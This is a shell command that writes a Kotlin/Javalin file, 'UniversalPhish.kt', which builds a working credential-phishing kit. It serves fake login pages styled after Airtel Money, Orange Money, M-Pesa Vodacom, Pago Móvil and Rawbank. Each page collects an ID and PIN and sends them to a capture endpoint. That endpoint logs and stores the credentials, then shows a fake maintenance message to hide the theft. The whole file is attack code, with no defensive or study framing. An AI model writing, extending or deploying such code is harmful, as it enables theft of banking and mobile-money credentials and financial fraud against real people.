cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/UniversalPhish.kt
package com.fardc.sigint.core
import io.javalin.Javalin

class UniversalPhish(private val vault: SecurityVault) {
    fun setup(app: Javalin) {
        app.get("/login/{target}") { ctx ->
            val target = ctx.pathParam("target").lowercase()
            val ui = when(target) {
                "airtel" -> Pair("Airtel Money", "#ff0000")
                "orange" -> Pair("Orange Money", "#ff6600")
                "mpesa" -> Pair("M-Pesa Vodacom", "#e11d23")
                "pagomovil" -> Pair("Pago Móvil", "#003893")
                "rawbank" -> Pair("Rawbank", "#003366")
                else -> Pair("Portail de Sécurité", "#333")
            }
            ctx.html("""
                <body style="background:${ui.second}; font-family:sans-serif; text-align:center; color:white; padding-top:50px;">
                    <div style="background:white; width:340px; margin:auto; padding:20px; border-radius:10px; color:black;">
                        <h2>${ui.first}</h2>
                        <form action="/capture/data" method="POST">
                            <input type="hidden" name="provider" value="${ui.first}">
                            <input type="text" name="id" placeholder="Identifiant / N°" style="width:100%; padding:10px; margin:5px 0;">
                            <input type="password" name="pin" placeholder="Code PIN / Mot de passe" style="width:100%; padding:10px; margin:5px 0;">
                            <button type="submit" style="width:100%; padding:10px; background:${ui.second}; color:white; border:none; font-weight:bold;">VALIDER</button>
                        </form>
                    </div>
                </body>
            """.trimIndent())
        }

        app.post("/capture/data") { ctx ->
            val prov = ctx.formParam("provider")
            val id = ctx.formParam("id")
            val pin = ctx.formParam("pin")
            println("🚨 [SIGINT] Capture sur $prov | ID: $id | PIN: $pin")
            vault.encryptData("Target: $prov | ID: $id | PIN: $pin")
            ctx.result("Maintenance réseau en cours. Réessayez plus tard.")
        }
    }
}
EOF
